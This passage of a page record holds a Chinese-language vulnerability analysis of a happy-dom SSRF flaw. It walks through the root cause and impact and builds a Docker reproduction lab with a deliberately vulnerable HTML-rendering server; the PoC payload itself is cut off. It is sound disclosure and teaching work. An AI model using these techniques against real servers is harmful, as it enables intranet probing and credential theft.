[{"_1":2,"_3":4},"root",{"_5":395},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1794530489000,"id","nqlap2xqkwi4vat4av41s3pd1","title","happy-dom 服务端 SSRF 漏洞 CVE-2026-118660 全链路分析与复现","originalTitle","CVE-2026-118660：happy-dom 服务端 SSRF 全链路分析","summary","CVE-2026-118660 影响 happy-dom < 21.0.0，高危、CVSS 8.6，类型为 CWE-918 服务端请求伪造；攻击者在不可信 HTML 被服务端解析且 link 或 iframe 元素完成连接时，可使 Node 进程向内网发起请求，iframe 响应还可能写入可读 DOM。","reason","文章通过源码走读、Docker 靶场与 Storybook 测试链复现，并讨论修复版本的绕过路径，可用于理解服务端 DOM 渲染中的请求外发风险。","source",{"_73":394},"links",{"_386":393},"publishedAt","2026-11-12T04:31:16.000Z","discoveredAt","2026-11-12T07:27:28.031Z","timelineAt","category","disclosure","tags",[389,390,391,74,392],"score",80,"selected",true,"channel","news","story",{"_80":81,"_13":82},"x","readingMode","full","author","body",{"_61":385,"_386":-5,"_387":386,"_388":37},"outline",[83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181],"relatedStories",[79],"topics",[68,69,70],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fWMICrkuQOK0","reportCount",1,"additionalSourceCount",0,{"_71":77,"_73":78},{"_71":75,"_73":76},{"_71":72,"_73":74},"slug","research","name","技术研究","vuln","漏洞披露","cloud-native","云与原生",{"_80":81,"_13":82},"publicId","fd497e87-3aeb-4728-a9f7-0887516d7f93","happy-dom SSRF 漏洞分析与复现",{"_11":383,"_183":384,"_185":193},{"_11":381,"_183":382,"_185":193},{"_11":379,"_183":380,"_185":193},{"_11":377,"_183":378,"_185":186},{"_11":375,"_183":376,"_185":186},{"_11":373,"_183":374,"_185":186},{"_11":371,"_183":372,"_185":193},{"_11":369,"_183":370,"_185":186},{"_11":367,"_183":368,"_185":186},{"_11":365,"_183":366,"_185":186},{"_11":363,"_183":364,"_185":186},{"_11":361,"_183":362,"_185":186},{"_11":359,"_183":360,"_185":193},{"_11":357,"_183":358,"_185":186},{"_11":355,"_183":356,"_185":186},{"_11":353,"_183":354,"_185":186},{"_11":351,"_183":352,"_185":186},{"_11":349,"_183":350,"_185":198},{"_11":347,"_183":348,"_185":198},{"_11":345,"_183":346,"_185":198},{"_11":343,"_183":344,"_185":198},{"_11":341,"_183":342,"_185":198},{"_11":339,"_183":340,"_185":186},{"_11":337,"_183":338,"_185":198},{"_11":335,"_183":336,"_185":198},{"_11":333,"_183":334,"_185":198},{"_11":331,"_183":332,"_185":198},{"_11":329,"_183":330,"_185":198},{"_11":327,"_183":328,"_185":186},{"_11":325,"_183":326,"_185":186},{"_11":323,"_183":324,"_185":186},{"_11":321,"_183":322,"_185":193},{"_11":319,"_183":320,"_185":186},{"_11":317,"_183":318,"_185":186},{"_11":315,"_183":316,"_185":186},{"_11":313,"_183":314,"_185":186},{"_11":311,"_183":312,"_185":186},{"_11":309,"_183":310,"_185":186},{"_11":307,"_183":308,"_185":198},{"_11":305,"_183":306,"_185":198},{"_11":303,"_183":304,"_185":198},{"_11":301,"_183":302,"_185":186},{"_11":299,"_183":300,"_185":198},{"_11":297,"_183":298,"_185":198},{"_11":295,"_183":296,"_185":198},{"_11":293,"_183":294,"_185":198},{"_11":291,"_183":292,"_185":198},{"_11":289,"_183":290,"_185":186},{"_11":287,"_183":288,"_185":193},{"_11":285,"_183":286,"_185":186},{"_11":283,"_183":284,"_185":186},{"_11":281,"_183":282,"_185":198},{"_11":279,"_183":280,"_185":198},{"_11":277,"_183":278,"_185":198},{"_11":275,"_183":276,"_185":198},{"_11":273,"_183":274,"_185":186},{"_11":271,"_183":272,"_185":198},{"_11":269,"_183":270,"_185":198},{"_11":267,"_183":268,"_185":198},{"_11":265,"_183":266,"_185":198},{"_11":263,"_183":264,"_185":198},{"_11":261,"_183":262,"_185":186},{"_11":259,"_183":260,"_185":198},{"_11":257,"_183":258,"_185":186},{"_11":255,"_183":256,"_185":186},{"_11":253,"_183":254,"_185":186},{"_11":251,"_183":252,"_185":193},{"_11":249,"_183":250,"_185":186},{"_11":247,"_183":248,"_185":198},{"_11":245,"_183":246,"_185":186},{"_11":243,"_183":244,"_185":198},{"_11":241,"_183":242,"_185":198},{"_11":239,"_183":240,"_185":198},{"_11":237,"_183":238,"_185":186},{"_11":235,"_183":236,"_185":198},{"_11":233,"_183":234,"_185":198},{"_11":231,"_183":232,"_185":198},{"_11":229,"_183":230,"_185":198},{"_11":227,"_183":228,"_185":198},{"_11":225,"_183":226,"_185":198},{"_11":223,"_183":224,"_185":186},{"_11":221,"_183":222,"_185":198},{"_11":219,"_183":220,"_185":198},{"_11":217,"_183":218,"_185":198},{"_11":215,"_183":216,"_185":198},{"_11":213,"_183":214,"_185":198},{"_11":211,"_183":212,"_185":198},{"_11":209,"_183":210,"_185":198},{"_11":207,"_183":208,"_185":186},{"_11":205,"_183":206,"_185":198},{"_11":203,"_183":204,"_185":198},{"_11":201,"_183":202,"_185":198},{"_11":199,"_183":200,"_185":198},{"_11":196,"_183":197,"_185":198},{"_11":194,"_183":195,"_185":186},{"_11":191,"_183":192,"_185":193},{"_11":189,"_183":190,"_185":186},{"_11":187,"_183":188,"_185":186},{"_11":182,"_183":184,"_185":186},"sec-99","text","7.4 参考资料","level",3,"sec-98","7.2 修复建议：分四层看","sec-97","7.1 一条链，四个结论","sec-96","七、结论与修复建议",2,"sec-95","6.6 本章结论","sec-94","6.5.5 共同缺失",4,"sec-93","6.5.4 权限继承","sec-92","6.5.3 验证点与执行点分离","sec-91","6.5.2 校验与授权混在一起","sec-90","6.5.1 出口级检查的覆盖率问题","sec-89","6.5 根因：三个视角看同一处缺失","sec-88","6.4.7 A 与 B 的差异","sec-87","6.4.6 结果","sec-86","6.4.5 本地复现","sec-85","6.4.4 实验拓扑","sec-84","6.4.3 重定向处理","sec-83","6.4.2 载荷","sec-82","6.4.1 威胁模型","sec-81","6.4 方向二：302 重定向","sec-80","6.3.6 为什么会漏掉这一支","sec-79","6.3.5 边界条件：CORS 决定这条路径能走多远","sec-78","6.3.4 结果","sec-77","6.3.3 本地复现","sec-76","6.3.2 载荷","sec-75","6.3.1 代码路径","sec-74","6.3 方向一：&lt;link rel=\"preload\" as=\"fetch\"&gt;","sec-73","6.2.3 判定规则","sec-72","6.2.2 三个测试","sec-71","6.2.1 环境","sec-70","6.2 实验设置与判定","sec-69","6.1.1 本地基线脚本","sec-68","6.1 补丁与基线","sec-67","六、修复版本的绕过尝试","sec-66","5.7 与第三章的对照","sec-65","5.6 为什么这是真实风险，而不只是\"测试噪音\"","sec-64","5.5 对照实验：修复版与官方缓解","sec-63","关于同源设定的说明","sec-62","5.4 证据解读","sec-61","5.3.5 内网服务侧取证","sec-60","5.3.4 运行 Storybook 测试链（核心步骤）","sec-59","5.3.3 启动内网服务并确认外部不可达","sec-58","5.3.2 构建受害镜像","sec-57","5.3.1 环境检查","sec-56","5.3 复现步骤（实测记录）","sec-55","5.2.4 内网靶标：不可直接访问的敏感服务","sec-54","5.2.3 PoC story：攻击者提交的 HTML","sec-53","5.2.2 受害项目：Storybook 测试链","sec-52","5.2.1 拓扑：一个受害进程 + 一个\"够不着\"的靶标","sec-51","5.2 复现环境搭建","sec-50","5.1 漏洞在这条链路里的位置","sec-49","五、换个宿主：在引用 happy-dom 的其他项目里触发","sec-48","4.8 回头再看这几个函数","sec-47","4.7.5 为什么这条链\"读得到\"：waitUntilComplete","sec-46","4.7.4 导航：BrowserFrameNavigator.navigate","sec-45","4.7.3 结构：BrowserFrameFactory.createChildFrame","sec-44","4.7.2 分流：HTMLIFrameElement.#loadPage","sec-43","4.7.1 扳机：HTMLIFrameElement.[connectedToDocument]","sec-42","4.7 &lt;iframe&gt;：无条件进场，响应写回","sec-41","4.6.3 盲：ResourceFetch.fetch","sec-40","4.6.2 放行：HTMLLinkElement.#loadStyleSheet","sec-39","4.6.1 分派：HTMLLinkElement.[connectedToDocument]","sec-38","4.6 &lt;link&gt;：三行分派，六道闸门","sec-37","4.5 唯一的出口：Fetch.sendRequest","sec-36","4.4 一路绿灯的安检：Fetch.send","sec-35","4.3 连接即加载：Node.[connectedToNode]","sec-34","4.2 属性先写、元素后入树：HTMLParser.parseEndOfStartTag","sec-33","4.1 字符串变成文档：BrowserFrame.content setter","sec-32","四、主要函数的作用与原理：从一段 HTML 到一次请求","sec-31","3.8 这套复现方法的三个要点","sec-30","3.7 一键端到端验证","sec-29","3.6 修复版对照：happy-dom 21.0.0","sec-28","⑤ 清理环境","sec-27","④ 核对内网服务完整日志","sec-26","③ 执行 PoC","sec-25","② 确认服务状态与版本","sec-24","① 构建并启动","sec-23","3.5 漏洞版复现：happy-dom 20.14.6","sec-22","3.4.5 poc.html：恶意载荷","sec-21","3.4.4 intranet/server.js：内网敏感服务（云元数据替身）","sec-20","3.4.3 web/server.js：受害应用（CVE 触发点）","sec-19","3.4.2 web/Dockerfile：受害应用镜像","sec-18","3.4.1 docker-compose.yml：拓扑与版本控制","sec-17","3.4 复现环境的五处关键代码","sec-16","3.3 目录结构","sec-15","3.2 靶场拓扑","sec-14","3.1 复现环境","sec-13","三、Docker 复现：把 SSRF 关进一个盒子","sec-12","2.5 为什么在浏览器里\"正常\"，在服务端就是漏洞","sec-11","2.4 危害","sec-10","2.3 触发条件","sec-9","2.2 根因：两个\"默认关闭的开关\"，其实是默认开启","sec-8","2.1 概要","sec-7","二、漏洞基本信息","sec-6","1.3 为什么\"能加载资源\"会成为问题","sec-5","1.2 谁在用，用在哪","sec-4","1.1 它是什么","sec-3","一、项目简介：一个\"没有界面的浏览器\"","sec-2","版本约定","sec-1","写在前面","<h2 id=\"sec-1\">写在前面</h2><p>happy-dom 是一个用 JavaScript 实现的 DOM 运行时。它被大量前端项目放进 Vitest / Jest 的测试环境，也被用在 SSR 预渲染、HTML 转换和爬虫里。这些场景有一个共同点：<strong>HTML 往往来自不可信的一方</strong>——用户评论、富文本、抓回来的第三方页面、上传的模板。</p><p>在浏览器里，页面里写了 <code>&lt;iframe src=\"...\"&gt;</code>，浏览器就会去加载它，这是规范行为，没有人觉得奇怪。问题在于，当同一段 HTML 被交给服务端的 happy-dom 时，去加载它的是<strong>服务器进程</strong>，而服务器进程通常站在内网里、握着云凭证、能访问只监听 localhost 的管理接口。同一个行为，换一个执行者，性质就从\"渲染页面\"变成了\"服务端请求伪造\"。</p><p>CVE-2026-118660 说的就是这件事。它的成因短得可以用两行配置描述，但从一段字符串到一次出网请求，中间要经过解析、连接、分派、安检、出口五道关；而修复版本选择在\"连接\"这一步设闸门，这个选择也决定了它后来为什么能被绕过。</p><h2 id=\"sec-2\">版本约定</h2><ul><li><p>漏洞原理与函数走读基于 <strong>happy-dom 20.14.6</strong> 源码，路径相对 <code>packages/happy-dom/src/</code>；</p></li><li><p>修复首发版本为 <strong>21.0.0</strong>，第三章的对照实验用的就是它；</p></li><li><p>第六章的绕过实验使用 <strong>21.0.4</strong>。21.0.0 到 21.0.4 之间 <code>Fetch.js</code> 有过改动（重定向时补上了跨源删除 <code>Authorization</code> 的处理），但本文涉及的三处修复点与加载路径行为一致，行号以 21.0.4 的编译产物为准。</p></li></ul><hr><h2 id=\"sec-3\">一、项目简介：一个\"没有界面的浏览器\"</h2><h3 id=\"sec-4\">1.1 它是什么</h3><p>Happy DOM 的官方定义是 <em>A JavaScript implementation of a web browser without its graphical user interface</em>——用 JavaScript 实现一个没有图形界面的 Web 浏览器。</p><p>它把浏览器内核里最核心的那部分——DOM、HTML 解析、CSS 选择器、事件、网络请求——用纯 JavaScript 在 Node.js / Bun 等运行时里重新实现了一遍，覆盖了大量 WHATWG 规范：HTML、DOM、CSS Object Model、Fetch、XMLHttpRequest、WebSocket 等等。结果是：在没有真实浏览器的情况下，你也能拿到一个完整、可编程的\"虚拟浏览器\"环境。</p><p>它的定位与 <strong>JSDOM</strong> 类似，但主打<strong>更轻量、更快</strong>。</p><p>核心特性包括：</p><ul><li><p>自定义元素 / Web Components</p></li><li><p>声明式 Shadow DOM</p></li><li><p>Mutation Observer、Tree Walker</p></li><li><p>Fetch API、XMLHttpRequest、WebSocket</p></li><li><p>CSS 选择器查询、事件系统、表单等大量 Web API</p></li><li><p>同时支持 ESM 和 CommonJS</p></li></ul><blockquote><p>仓库：<a href=\"https://github.com/capricorn86/happy-dom\">https://github.com/capricorn86/happy-dom</a>　｜　NPM 包名：<code>happy-dom</code></p></blockquote><h3 id=\"sec-5\">1.2 谁在用，用在哪</h3><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>场景</p></th><th colspan=\"1\" rowspan=\"1\"><p>典型用法</p></th><th colspan=\"1\" rowspan=\"1\"><p>谁在发请求</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>前端单元测试（最主要）</p></td><td colspan=\"1\" rowspan=\"1\"><p>Vitest 的 <code>environment: 'happy-dom'</code>、Jest 的 <code>@happy-dom/jest-environment</code>、Testing Library 组件测试、React / Vue / Svelte / Angular / Lit 组件测试、Bun 运行时</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>跑测试的 Node 进程</strong>（开发者本机或 CI runner）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>服务端渲染（SSR）</p></td><td colspan=\"1\" rowspan=\"1\"><p>在服务器上解析、渲染组件与页面，官方提供 <code>@happy-dom/server-renderer</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>应用服务进程</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Web 爬虫 / 数据抓取</p></td><td colspan=\"1\" rowspan=\"1\"><p>不启动 headless Chrome，直接请求页面、解析 HTML、用 <code>querySelector</code> 提取数据</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>抓取服务进程</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>通用 DOM 工具</p></td><td colspan=\"1\" rowspan=\"1\"><p>HTML 文档处理与转换、静态分析、批量修改、为无头环境补 <code>window</code> / <code>document</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>取决于宿主的输入</p></td></tr></tbody></table><p>前两类是这个漏洞真正的落点：它们让 happy-dom 跑在<strong>有内网身份</strong>的进程里，而喂给它的 HTML 又常常来自外部。测试环境尤其容易被忽略——CI runner 往往就在内网，出网限制比生产环境宽松，日志里的外部请求也很少被当成安全事件。</p><h3 id=\"sec-6\">1.3 为什么\"能加载资源\"会成为问题</h3><p>happy-dom 的目标是\"像一个浏览器那样工作\"。浏览器加载 <code>&lt;link&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>，是因为页面作者希望页面这样呈现；目标 URL 由页面作者选择，风险由访问者承担。</p><p>服务端解析的模型完全不同：</p><ul><li><p>页面作者不再是可信的站点所有者，而可能是提交评论的任意用户；</p></li><li><p>\"访问者\"变成了服务器进程，它的网络位置就是内网的网络位置；</p></li><li><p>加载行为没有任何可见的界面提示，只留下一条出网请求。</p></li></ul><p>库沿用了浏览器的语义，却没有对应的威胁模型。这个错配不是某一行的笔误，而是 CVE-2026-118660 的根：<strong>默认值就是策略，而默认值假设自己身处浏览器</strong>。</p><hr><h2 id=\"sec-7\">二、漏洞基本信息</h2><h3 id=\"sec-8\">2.1 概要</h3><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>项目</p></th><th colspan=\"1\" rowspan=\"1\"><p>内容</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVE 编号</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVE-2026-118660</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>公告编号</p></td><td colspan=\"1\" rowspan=\"1\"><p>GHSA-c8p4-j97h-3vg8</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>影响组件</p></td><td colspan=\"1\" rowspan=\"1\"><p><a href=\"https://github.com/capricorn86/happy-dom\">Happy DOM</a>（无 GUI 的 JavaScript 浏览器实现）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>漏洞类型</p></td><td colspan=\"1\" rowspan=\"1\"><p>CWE-918 服务端请求伪造（SSRF）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>严重程度</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>高危 — CVSS 8.6</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>受影响版本</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>&lt; 21.0.0</code>（实测覆盖 17.6.3、20.14.6）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复版本</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>21.0.0</strong></p></td></tr></tbody></table><h3 id=\"sec-9\">2.2 根因：两个\"默认关闭的开关\"，其实是默认开启</h3><p><code>BrowserSettings</code> 里有两个与外部资源加载相关的选项，在 21.0.0 之前长这样：</p><pre><code>// happy-dom &lt; 21.0.0 的 DefaultBrowserSettings（节选）\n{\n  disableIframePageLoading: false,  // iframe 页面加载默认开启\n  disableCSSFileLoading: false      // CSS 文件加载默认开启\n}\n</code></pre><p>注意命名：它们是 <code>disable*</code>，语义是\"禁止某行为\"，默认 <code>false</code> 意味着<strong>不禁止</strong>，也就是加载默认开启。这是一个 opt-out 模型——想安全必须主动关，不关就是开。</p><p>于是当应用在服务端解析不可信 HTML 时，HTML 里嵌入的这两类元素会被 happy-dom <strong>自动发起真实 HTTP 请求</strong>：</p><ul><li><p><code>&lt;iframe src=\"...\"&gt;</code> —— iframe 的 <code>src</code> URL；</p></li><li><p><code>&lt;link rel=\"stylesheet\" href=\"...\"&gt;</code> —— 样式表的 <code>href</code> URL。</p></li></ul><p>整个过程不需要任何特殊配置或额外开启（无需 opt-in）。攻击者只要控制被解析的 HTML，就能让服务器向任意目标发起请求。</p><p>修复版本做的事很直接：把默认值的方向翻过来，新增 <code>enableCSSFileLoading</code> / <code>enableIframePageLoading</code>，默认 <code>false</code>。第六章会看到，这个\"翻转默认值\"的修复模型，正是后续绕过的起点。</p><h3 id=\"sec-10\">2.3 触发条件</h3><p>漏洞成立需要两个条件同时满足：</p><ol><li><p><strong>不可信 HTML 进入 happy-dom 的解析器</strong>。常见入口不止 <code>page.content</code>，还包括已连接元素的 <code>innerHTML</code>、<code>insertAdjacentHTML</code>、<code>shadowRoot.innerHTML</code>，以及 <code>DOMParser</code> 解析后挂载、<code>&lt;template&gt;</code> 内容克隆后挂载等等（第四章按\"元素何时被连接\"把入口分成三类）。</p></li><li><p><strong>解析出的 </strong><code>&lt;link rel=\"stylesheet\"&gt;</code><strong> 或 </strong><code>&lt;iframe&gt;</code><strong> 被连接进文档</strong>。决定请求的是连接，不是\"用了哪个写 HTML 的 API\"。</p></li></ol><p>两条同时满足，请求就会在解析的同一次调用链里发出。反过来，<code>&lt;template&gt;</code> 里的内容不触发，也不是因为被拦截，而只是因为它\"还没连上\"。</p><h3 id=\"sec-11\">2.4 危害</h3><ul><li><p><strong>云凭证窃取</strong>：访问云厂商元数据端点，获取临时访问凭证（AWS / GCP / Azure 等）；</p></li><li><p><strong>内网探测</strong>：对内部网络做端口与服务扫描；</p></li><li><p><strong>敏感数据泄露</strong>：请求内部接口，并通过应用回显把响应内容带出来；</p></li><li><p><strong>数据外带</strong>：把 SSRF 当作数据外泄通道。</p></li></ul><p>两条向量在危害上并不对等，这一点在第四章会展开：<code>&lt;link&gt;</code> 路径的响应只进 CSS 解析器，属于<strong>盲 SSRF</strong>；<code>&lt;iframe&gt;</code> 路径的响应体会被写回子 frame 的文档，应用只要读一下 <code>childFrames[0].window.document.body.innerHTML</code>，内网数据就进了进程——对应 CVSS 里的机密性高影响（C:H）。</p><h3 id=\"sec-12\">2.5 为什么在浏览器里\"正常\"，在服务端就是漏洞</h3><p>三个变化叠在一起：</p><ul><li><p><strong>发起方变了</strong>。浏览器里 iframe 请求由访问者的浏览器发出；服务端解析时由应用进程发出。后者通常就在内网，能访问云元数据端点、内部管理面和只监听 localhost 的服务。</p></li><li><p><strong>目标的选择权变了</strong>。浏览器里目标由页面作者决定，服务端场景里由提交 HTML 的攻击者决定。</p></li><li><p><strong>信任假设变了</strong>。happy-dom 假设自己身处浏览器，没有\"服务端代理\"这个威胁模型。第四章会看到，<code>Fetch.send()</code> 把 referrer、CORS、缓存、Mixed Content 都实现了一遍，唯独没有一条检查在问\"这个 host 是不是内网\"。</p></li></ul><p>这三点也是后面两章判断\"是不是真风险\"的标尺：只要 HTML 来自外部、解析发生在服务端，行为正确与否就不该由\"浏览器也会这么做\"来辩护。</p><hr><h2 id=\"sec-13\">三、Docker 复现：把 SSRF 关进一个盒子</h2><p>复现的目标不是\"看到一条请求\"，而是拿到一条<strong>无法用别的解释搪塞</strong>的证据链：内网服务根本不向宿主机发布端口，攻击者也没有任何直接访问它的通道；只要它的日志里出现 <code>[SSRF-HIT]</code>，这行日志就只能来自受害应用被诱导后\"代为发起\"的请求。这正是 SSRF 的定义性证据。</p><h3 id=\"sec-14\">3.1 复现环境</h3><p>复现在远程 Ubuntu 服务器上通过 SSH 执行。</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>项目</p></th><th colspan=\"1\" rowspan=\"1\"><p>值</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>系统</p></td><td colspan=\"1\" rowspan=\"1\"><p>Ubuntu 26.04.1 LTS（aarch64，内核 <code>7.0.0-42-generic</code>）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Docker</p></td><td colspan=\"1\" rowspan=\"1\"><p>29.9.3（build 5457199）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Docker Compose</p></td><td colspan=\"1\" rowspan=\"1\"><p>v5.7.0</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>复现目录</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>~/CVE-2026-118660-repro</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>端口检查</p></td><td colspan=\"1\" rowspan=\"1\"><p>宿主机 8080 端口空闲（<code>ss -ltn</code> 确认）</p></td></tr></tbody></table><h3 id=\"sec-15\">3.2 靶场拓扑</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F12%2F1219%2Fed1c7ab2-ebf.jpg&amp;mode=full&amp;exp=1794787200&amp;sig=0157c341a30eb87c\" loading=\"lazy\" decoding=\"async\"></p><p><em>图 3-1　靶场拓扑：受害应用代替攻击者访问仅内网可达的靶标（图片：00-diagram-repro-topology.jpg）</em></p><p>两个服务同处一个 <code>demo</code> 网络，但 <code>intranet</code> <strong>不向宿主机发布任何端口</strong>。这个设计有两个作用：</p><ul><li><p>排除\"攻击者自己 curl 了内网\"的可能——他没有路由；</p></li><li><p>让内网服务的日志成为唯一权威证据，命中即代表来自 <code>web</code> 容器的真实流量。</p></li></ul><h3 id=\"sec-16\">3.3 目录结构</h3><pre><code>CVE-2026-118660-repro/\n├── docker-compose.yml   # 两个服务：web（受害应用，发布 8080）+ intranet（内网专用，不发布端口）\n├── web/\n│   ├── Dockerfile       # 基于官方 node:22-alpine，npm 安装指定版本 happy-dom（build arg 控制）\n│   └── server.js        # 受害应用：POST /render 用默认配置解析不可信 HTML 并回显 iframe 内容\n├── intranet/\n│   └── server.js        # 模拟仅内网可达的敏感服务（云元数据替身），每次请求记录 [SSRF-HIT]\n├── poc.html             # 恶意 HTML：&lt;link rel=stylesheet&gt; + &lt;iframe src&gt; 指向内网服务\n├── poc.sh               # 单次 PoC：提交 poc.html 并展示响应与内网服务日志\n├── verify.sh            # 一键端到端验证：漏洞版（20.14.6）触发断言 / 修复版（21.0.0）不触发\n└── README.md\n</code></pre><h3 id=\"sec-17\">3.4 复现环境的五处关键代码</h3><p>下面把这份靶场拆成五块看：拓扑与版本控制、受害应用镜像、触发点所在的 <code>server.js</code>、内网靶标，以及最后那份恶意载荷。</p><h4 id=\"sec-18\">3.4.1 <code>docker-compose.yml</code>：拓扑与版本控制</h4><pre><code>services:\n  web:\n    build:\n      context: ./web\n      args:\n        HAPPY_DOM_VERSION: ${HAPPY_DOM_VERSION:-20.14.6}   # 默认漏洞版，可用环境变量切换\n    image: cve-2026-118660/web:${HAPPY_DOM_VERSION:-20.14.6}\n    ports:\n      - \"${WEB_PORT:-8080}:3000\"      # 唯一对外入口\n    depends_on:\n      - intranet\n    networks:\n      - demo\n\n  intranet:\n    image: node:22-alpine\n    command: node /app/server.js\n    volumes:\n      - ./intranet/server.js:/app/server.js:ro\n    networks:\n      - demo\n      # 注意：没有任何 ports: —— 不向宿主机发布\nnetworks:\n  demo: {}\n</code></pre><p>有两个要点：</p><ul><li><p><code>HAPPY_DOM_VERSION</code> 这个 build arg 同时控制安装版本与镜像 tag，<strong>漏洞版 / 修复版对照只需要换一个环境变量</strong>；</p></li><li><p><code>intranet</code> 服务没有 <code>ports:</code> 映射，宿主机与外部均不可达，只有同一 <code>demo</code> 网络内的 <code>web</code> 能访问。</p></li></ul><h4 id=\"sec-19\">3.4.2 <code>web/Dockerfile</code>：受害应用镜像</h4><pre><code>FROM node:22-alpine\n\nARG HAPPY_DOM_VERSION=20.14.6\nENV HAPPY_DOM_VERSION=${HAPPY_DOM_VERSION}\nENV NODE_ENV=production\n\nWORKDIR /app\n# 受影响版本 &lt;= 20.14.6（漏洞）；&gt;= 21.0.0（修复，默认禁用外部资源加载）\nRUN npm install --no-audit --no-fund \"happy-dom@${HAPPY_DOM_VERSION}\"\n\nCOPY server.js server.js\n\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]\n</code></pre><p>happy-dom 没有官方镜像，直接基于官方 <code>node:22-alpine</code> 安装目标版本的 npm 包，干净且可复现。</p><h4 id=\"sec-20\">3.4.3 <code>web/server.js</code>：受害应用（CVE 触发点）</h4><p>核心逻辑在 <code>POST /render</code>：</p><pre><code>// 关键：new Browser() 未传任何 settings —— 即 CVE 所述\"默认开启外部资源加载\"的姿态\nbrowser = new Browser();\nconst page = browser.newPage();\npage.url = 'http://web-app.internal/';\npage.content = body;                    // 用户提交的不可信 HTML\nawait Promise.race([\n  page.waitUntilComplete(),             // 等待外部资源（CSS / iframe）加载完成\n  new Promise((resolve) =&gt; setTimeout(resolve, 15000)),\n]);\n// 读取 iframe 加载的页面内容 —— \"回显给攻击者\"的数据外泄路径\nconst frames = page.mainFrame.childFrames;\nif (frames.length &gt; 0 &amp;&amp; frames[0].window &amp;&amp; frames[0].window.document) {\n  result.iframeUrl = frames[0].url;\n  result.iframeContent = frames[0].window.document.body\n    ? frames[0].window.document.body.innerHTML : null;\n}\n// ...最终 res.end(JSON.stringify(result, null, 2))\n</code></pre><p>这段代码模拟的是一类真实业务：服务端 HTML 转 PDF、富文本过滤、SSR 预渲染、爬虫正文提取。它们的共同点是<strong>把不可信 HTML 交给 DOM 实现，并把处理结果返回给提交者</strong>。</p><p>值得注意两点：</p><ul><li><p><code>page.content</code> 赋值这一步就足以触发漏洞，后面的回显只是把危害从\"盲 SSRF\"升级为\"机密数据泄露\"；</p></li><li><p><code>Promise.race</code> 里那个 15 秒兜底不是随手写的——第四章会说明，样式表路径<strong>根本没有超时机制</strong>，不加兜底，一个不响应的目标就能把 <code>waitUntilComplete()</code> 拖到天荒地老。</p></li></ul><p>另外，这里读的是 <code>page.mainFrame.childFrames[0].window.document</code>，而不是 <code>iframe.contentDocument</code>。这个细节是第四章\"frame 树绕开跨源代理\"那一段的实证。</p><h4 id=\"sec-21\">3.4.4 <code>intranet/server.js</code>：内网敏感服务（云元数据替身）</h4><pre><code>const SECRET_TOKEN = 'INTERNAL-ONLY-TOKEN-' + crypto.randomBytes(8).toString('hex');\n\nconst server = http.createServer((req, res) =&gt; {\n  console.log(`[SSRF-HIT] ${new Date().toISOString()} ${req.method} ${req.url} | internal-only service reached!`);\n  const isCss = req.url.endsWith('.css');\n  res.writeHead(200, { 'Content-Type': isCss ? 'text/css' : 'text/html' });\n  if (isCss) {\n    res.end('body { color: red; }');\n  } else {\n    res.end(`&lt;html&gt;&lt;body&gt;SECRET: ${SECRET_TOKEN} (cloud-metadata-like internal data)&lt;/body&gt;&lt;/html&gt;`);\n  }\n});\n</code></pre><p>三个设计意图：</p><ul><li><p>每次请求记录一行 <code>[SSRF-HIT]</code>（请求方法 + URL + 时间戳），这是 SSRF 是否发生的<strong>唯一权威证据</strong>；</p></li><li><p>非 <code>.css</code> 请求返回含随机 token 的\"机密\"响应体，模拟 <code>http://xx.xx.xx.xx/latest/meta-data/...</code> 这类元数据端点；</p></li><li><p><strong>token 每次容器启动随机生成</strong>。<code>verify.sh</code> 借此做严格关联断言：只有\"当次运行日志里的 token\"出现在\"攻击者收到的响应里\"才算泄露，排除拼凑旧输出的误判。</p></li></ul><h4 id=\"sec-22\">3.4.5 <code>poc.html</code>：恶意载荷</h4><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;!-- 攻击向量 1：&lt;link 